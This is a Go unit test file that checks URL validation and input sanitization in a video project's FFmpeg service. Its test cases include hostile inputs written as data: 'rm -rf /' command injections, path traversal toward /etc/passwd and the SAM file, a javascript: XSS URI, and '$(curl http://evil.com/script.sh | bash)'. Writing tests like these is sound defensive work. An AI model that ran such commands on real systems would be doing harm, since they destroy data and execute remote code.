package services

import (
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/activadee/videocraft/internal/config"
	"github.com/activadee/videocraft/internal/domain/models"
)

func TestFFmpegService_SecurityEdgeCases(t *testing.T) {
	cfg := &config.Config{
		FFmpeg: config.FFmpegConfig{
			BinaryPath: "ffmpeg",
			Timeout:    time.Minute * 5,
		},
	}
	
	mockLogger := &NoopLogger{}
	service := &ffmpegService{
		cfg: cfg,
		log: mockLogger,
	}

	tests := []struct {
		name           string
		url            string
		shouldFail     bool
		expectedError  string
	}{
		{
			name:          "Empty URL should be allowed",
			url:           "",
			shouldFail:    false,
		},
		{
			name:          "URL with query parameters",
			url:           "https://example.com/video.mp4?token=abc123",
			shouldFail:    false,
		},
		{
			name:          "URL with fragment",
			url:           "https://example.com/video.mp4#section",
			shouldFail:    false,
		},
		{
			name:          "Unicode in URL",
			url:           "https://example.com/видео.mp4",
			shouldFail:    false,
		},
		{
			name:          "Very long URL",
			url:           "https://example.com/" + strings.Repeat("a", 2000),
			shouldFail:    false,
		},
		{
			name:          "URL with encoded characters",
			url:           "https://example.com/video%20file.mp4",
			shouldFail:    false,
		},
		{
			name:          "FTP protocol should fail",
			url:           "ftp://example.com/video.mp4",
			shouldFail:    true,
			expectedError: "Protocol not allowed",
		},
		{
			name:          "Case variations in data URI",
			url:           "DATA:text/plain;base64,SGVsbG8=",
			shouldFail:    true,
			expectedError: "Protocol not allowed",
		},
		{
			name:          "Mixed case protocol",
			url:           "HTTP://example.com/video.mp4",
			shouldFail:    false,
		},
		{
			name:          "JavaScript protocol",
			url:           "javascript:alert('xss')",
			shouldFail:    true,
			expectedError: "Protocol not allowed",
		},
		{
			name:          "Multiple slashes in path traversal",
			url:           "https://example.com/../../../etc/passwd",
			shouldFail:    true,
			expectedError: "URL contains path traversal sequences",
		},
		{
			name:          "Windows-style path traversal",
			url:           "https://example.com/..\\..\\windows\\system32\\config\\sam",
			shouldFail:    true,
			expectedError: "URL contains path traversal sequences",
		},
		{
			name:          "Command injection with encoded semicolon",
			url:           "https://example.com/video.mp4%3Brm%20-rf%20/",
			shouldFail:    false, // URL encoding should be allowed
		},
		{
			name:          "Command injection with null byte",
			url:           "https://example.com/video.mp4\x00; rm -rf /",
			shouldFail:    true,
			expectedError: "URL contains prohibited characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := service.ValidateURL(tt.url)
			
			if tt.shouldFail {
				require.Error(t, err, "Expected validation to fail for URL: %s", tt.url)
				if tt.expectedError != "" {
					assert.Contains(t, err.Error(), tt.expectedError)
				}
			} else {
				assert.NoError(t, err, "Expected validation to pass for URL: %s", tt.url)
			}
		})
	}
}

func TestFFmpegService_InputSanitization_EdgeCases(t *testing.T) {
	cfg := &config.Config{
		FFmpeg: config.FFmpegConfig{
			BinaryPath: "ffmpeg",
			Timeout:    time.Minute * 5,
		},
	}
	
	mockLogger := &NoopLogger{}
	service := &ffmpegService{
		cfg: cfg,
		log: mockLogger,
	}

	tests := []struct {
		name           string
		input          string
		expectedOutput string
		shouldFail     bool
	}{
		{
			name:           "Empty input",
			input:          "",
			expectedOutput: "",
			shouldFail:     false,
		},
		{
			name:       "Whitespace only",
			input:      "   \t\n  ",
			shouldFail: true, // This should fail because it becomes empty after sanitization
		},
		{
			name:           "Normal filename",
			input:          "video.mp4",
			expectedOutput: "video.mp4",
			shouldFail:     false,
		},
		{
			name:           "Filename with numbers",
			input:          "video123.mp4",
			expectedOutput: "video123.mp4",
			shouldFail:     false,
		},
		{
			name:           "URL with domain",
			input:          "https://example.com/video.mp4",
			expectedOutput: "https://example.com/video.mp4",
			shouldFail:     false,
		},
		{
			name:           "Command after filename",
			input:          "video.mp4 && rm -rf /",
			expectedOutput: "video.mp4",
			shouldFail:     false,
		},
		{
			name:           "Multiple commands",
			input:          "video.mp4; cat /etc/passwd; rm file",
			expectedOutput: "video.mp4",
			shouldFail:     false,
		},
		{
			name:      "Only dangerous command",
			input:     "rm",
			shouldFail: true,
		},
		{
			name:      "Only sudo command",
			input:     "sudo",
			shouldFail: true,
		},
		{
			name:      "Only powershell command",
			input:     "powershell",
			shouldFail: true,
		},
		{
			name:      "Case insensitive dangerous command",
			input:     "RM",
			shouldFail: true,
		},
		{
			name:           "Filename with dashes and underscores",
			input:          "my-video_file.mp4",
			expectedOutput: "my-video_file.mp4",
			shouldFail:     false,
		},
		{
			name:           "Path traversal mixed with filename",
			input:          "../../../etc/passwd",
			expectedOutput: "etc/passwd",
			shouldFail:     false,
		},
		{
			name:           "Complex injection attempt",
			input:          "$(curl http://evil.com/script.sh | bash)",
			expectedOutput: "curl",
			shouldFail:     true, // "curl" is in dangerous commands
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := service.SanitizeInput(tt.input)
			
			if tt.shouldFail {
				require.Error(t, err, "Expected sanitization to fail for input: %s", tt.input)
			} else {
				require.NoError(t, err, "Expected sanitization to succeed for input: %s", tt.input)
				assert.Equal(t, tt.expectedOutput, result)
			}
		})
	}
}

func TestFFmpegService_PerformanceWithManyURLs(t *testing.T) {
	cfg := &config.Config{
		FFmpeg: config.FFmpegConfig{
			BinaryPath: "ffmpeg",
			Timeout:    time.Minute * 5,
		},
	}
	
	mockLogger := &NoopLogger{}
	service := &ffmpegService{
		cfg: cfg,
		log: mockLogger,
	}

	// Create a large configuration with many URLs
	const numProjects = 10
	const numScenesPerProject = 10
	const numElementsPerScene = 10

	config := make(models.VideoConfigArray, numProjects)
	for i := 0; i < numProjects; i++ {
		config[i] = models.VideoProject{
			Scenes: make([]models.Scene, numScenesPerProject),
		}
		
		for j := 0; j < numScenesPerProject; j++ {
			config[i].Scenes[j] = models.Scene{
				Elements: make([]models.Element, numElementsPerScene),
			}
			
			for k := 0; k < numElementsPerScene; k++ {
				config[i].Scenes[j].Elements[k] = models.Element{
					Type: "audio",
					Src:  "https://example.com/audio.wav",
				}
			}
		}
	}

	// Measure performance
	start := time.Now()
	err := service.validateAllURLsInConfig(&config)
	duration := time.Since(start)

	require.NoError(t, err, "Validation should succeed for valid URLs")
	
	// Should validate 1000 URLs in reasonable time (under 100ms)
	assert.Less(t, duration, 100*time.Millisecond, 
		"Validation of %d URLs took too long: %v", 
		numProjects*numScenesPerProject*numElementsPerScene, duration)
	
	t.Logf("Validated %d URLs in %v", 
		numProjects*numScenesPerProject*numElementsPerScene, duration)
}

func TestFFmpegService_SecurityLoggingIntegration(t *testing.T) {
	cfg := &config.Config{
		FFmpeg: config.FFmpegConfig{
			BinaryPath: "ffmpeg",
			Timeout:    time.Minute * 5,
		},
	}
	
	// Use a mock logger that captures log entries for verification
	mockLogger := &NoopLogger{}
	service := &ffmpegService{
		cfg: cfg,
		log: mockLogger,
	}

	// Test various malicious URLs to ensure logging works
	maliciousURLs := []string{
		"http://example.com/video.mp4; rm -rf /",
		"file:///etc/passwd",
		"data:text/plain;base64,SGVsbG8=",
		"http://example.com/../../../etc/passwd",
	}

	for _, url := range maliciousURLs {
		err := service.ValidateURL(url)
		require.Error(t, err, "URL should be rejected: %s", url)
	}
	
	// Note: In a real implementation, we would verify that security 
	// violations were logged with proper structured data
}